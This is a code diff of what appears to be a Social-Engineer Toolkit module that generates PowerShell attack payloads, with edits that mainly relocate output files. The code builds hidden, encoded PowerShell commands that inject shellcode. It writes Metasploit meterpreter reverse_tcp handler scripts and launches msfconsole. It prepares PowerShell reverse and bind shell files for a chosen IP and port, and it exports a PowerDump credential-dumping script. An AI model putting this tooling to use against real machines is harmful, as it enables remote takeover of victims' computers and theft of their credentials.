@@ -21,36 +21,30 @@ if powershell_menu_choice != "99":
 
     # if we select alphanumeric shellcode
     if powershell_menu_choice == "1":
-
+        port = raw_input(setprompt(["29"], "Enter the port for the reverse [443]"))
+        if port == "": port = "443"
+        update_options("PORT=" + port)
+        update_options("POWERSHELL_SOLO=ON")
         print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")
-        import src.payloads.powershell.prep
+        try: reload(src.payloads.powershell.prep)
+        except: import src.payloads.powershell.prep
         # create the directory if it does not exist
-        if not os.path.isdir("reports/powershell"):
-            os.makedirs("reports/powershell")
+        if not os.path.isdir(setdir + "/reports/powershell"):
+            os.makedirs(setdir + "/reports/powershell")
 
         # here we format everything for us
-        x64 = file("src/program_junk/x64.powershell", "r")
+        x64 = file(setdir + "/x64.powershell", "r")
         x64 = x64.read()
         x64 = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + x64
-        x86 = file("src/program_junk/x86.powershell", "r")
+        x86 = file(setdir + "/x86.powershell", "r")
         x86 = x86.read()
         x86 = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + x86
-
-        print_status("If you want the powershell commands and attack, they are exported to reports/powershell/")
-        filewrite = file("reports/powershell/x64_powershell_injection.txt", "w")
+        print_status("If you want the powershell commands and attack, they are exported to %s/reports/powershell/" % (setdir))
+        filewrite = file(setdir + "/reports/powershell/x64_powershell_injection.txt", "w")
         filewrite.write(x64)
         filewrite.close()
-        filewrite = file("reports/powershell/x86_powershell_injection.txt", "w")
+        filewrite = file(setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
         filewrite.write(x86)
-
-        # grab port specifications
-        if check_options("PORT=") != 0:
-            port = check_options("PORT=")
-
-        else:
-            port=raw_input(setprompt(["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
-            if port == "": port = "443"
-            update_options("PORT=" + port)
 
         choice = yesno_prompt("0","Do you want to start the listener now [yes/no]: ")
         if choice == 'NO':
@@ -60,17 +54,17 @@ if powershell_menu_choice != "99":
         if choice == 'YES':
             victim = raw_input(setprompt(["29"], "Select x86 or x64 victim machine [default: x64]"))
             if victim == "x86":
-                filewrite = file("reports/powershell/powershell.rc", "w")
+                filewrite = file(setdir + "/reports/powershell/powershell.rc", "w")
                 filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lport %s\nset LHOST 0.0.0.0\nexploit -j" % (port))
                 filewrite.close()
             else:
-                filewrite = file("reports/powershell/powershell.rc", "w")
+                filewrite = file(setdir + "/reports/powershell/powershell.rc", "w")
                 filewrite.write("use multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset lport %s\nset LHOST 0.0.0.0\nexploit -j" % (port))
                 filewrite.close()
             msf_path = meta_path()
-            subprocess.Popen("ruby %s/msfconsole -L -n -r reports/powershell/powershell.rc" % (msf_path), shell=True).wait()
+            subprocess.Popen("ruby %s/msfconsole -L -n -r %s/reports/powershell/powershell.rc" % (msf_path, setdir), shell=True).wait()
 
-        print_status("Powershell files can be found under reports/powershell/")
+        print_status("Powershell files can be found under %s/reports/powershell/" % (setdir))
         return_continue()
 
     # if we select powershell reverse shell
@@ -86,11 +80,11 @@ if powershell_menu_choice != "99":
         data = fileopen.read()
         data = data.replace("IPADDRHERE", ipaddr)
         data = data.replace("PORTHERE", port)
-        print_status("Exporting the powershell stuff to reports/powershell")
+        print_status("Exporting the powershell stuff to %s/reports/powershell" % (setdir))
         # create the directory if it does not exist
-        if not os.path.isdir("reports/powershell"):
-            os.makedirs("reports/powershell")
-        filewrite = file("reports/powershell/powershell.reverse.txt", "w")
+        if not os.path.isdir(setdir + "/reports/powershell"):
+            os.makedirs(setdir + "/reports/powershell")
+        filewrite = file(setdir + "/reports/powershell/powershell.reverse.txt", "w")
         filewrite.write(data)
         filewrite.close()
 
@@ -112,12 +106,12 @@ if powershell_menu_choice != "99":
         data = fileopen.read()
         data = data.replace("PORTHERE", port)
         # create the directory if it does not exist
-        if not os.path.isdir("reports/powershell"):
-            os.makedirs("reports/powershell")
-        filewrite = file("reports/powershell/powershell.bind.txt", "w")
+        if not os.path.isdir(setdir + "/reports/powershell"):
+            os.makedirs(setdir + "/reports/powershell")
+        filewrite = file(setdir + "/reports/powershell/powershell.bind.txt", "w")
         filewrite.write(data)
         filewrite.close()
-        print_status("The powershell program has been exported to reports/powershell/")
+        print_status("The powershell program has been exported to %s/reports/powershell/" % (setdir))
         return_continue()
 
 
@@ -125,11 +119,11 @@ if powershell_menu_choice != "99":
     if powershell_menu_choice == "4":
 
         # create the directory if it does not exist
-        if not os.path.isdir("reports/powershell"):
-            os.makedirs("reports/powershell")
+        if not os.path.isdir(setdir + "/reports/powershell"):
+            os.makedirs(setdir + "/reports/powershell")
         # copy file
         if os.path.isfile("src/powershell/powerdump.encoded"):
-            shutil.copyfile("src/powershell/powerdump.encoded", "reports/powershell/powerdump.encoded.txt")
-        print_status("The powershell program has been exported to reports/powershell/")
+            shutil.copyfile("src/powershell/powerdump.encoded", setdir + "/reports/powershell/powerdump.encoded.txt")
+        print_status("The powershell program has been exported to %s/reports/powershell/" % (setdir))
         print_status("Note with PowerDump -- You MUST be running as SYSTEM when executing.")
         return_continue()
